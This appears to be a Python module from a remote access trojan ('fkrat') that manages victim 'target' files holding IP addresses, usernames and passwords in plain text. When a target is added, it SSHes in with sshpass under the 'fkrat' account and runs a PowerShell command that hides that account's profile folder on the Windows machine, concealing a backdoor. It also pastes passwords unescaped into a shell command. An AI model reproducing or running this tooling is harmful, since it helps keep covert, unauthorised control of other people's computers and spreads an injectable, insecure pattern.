import os
import readline
import sys
import re

from modules import payloads as pay


def rlinput(prompt, prefill=''):
    readline.set_startup_hook(lambda: readline.insert_text(prefill))
    try:
        return input(prompt)  # or raw_input in Python 2
    finally:
        readline.set_startup_hook()


def rmWhiteSpace(var):
    output = ""
    for char in var:
        if char != " ":
            output += char
    return output


def edit_file(file):
    config = pay.read_config(file)
    username = rlinput("       Username   : ", config.get("USERNAME")).replace(" ", "")
    ip = rlinput("       Ip         : ", config.get("IPADDRESS")).replace(" ", "")
    password = rlinput("       Password   : ", config.get("PASSWORD")).replace(" ", "")

    target_file = open(f"./targets/{file}", "w")
    target_file.write(f"{ip} \n{password} \n{username}")


def new_file():
    file_name = rmWhiteSpace(input(f"Filename   : "))
    username = rmWhiteSpace(input(f"Username   : "))
    ip = rmWhiteSpace(input(f"Ip         : "))
    password = rmWhiteSpace(input(f"Password   : "))

    if not os.path.exists("./targets"):
        os.mkdir("./targets")
    target_file = open(f"./targets/{file_name}.fk", "w")
    target_file.write(f"{ip} \n{password} \n{username}")
    print("Please wait while we configure everything (Shouldn't take longer that 10 seconds)")
    os.system(
        f"sshpass -p \"{password}\" ssh fkrat@{ip} -o StrictHostKeyChecking=accept-new " +
        " 'powershell attrib.exe +h C:/Users/fkrat'")


def delete_file(file):
    os.remove("./targets/" + file)
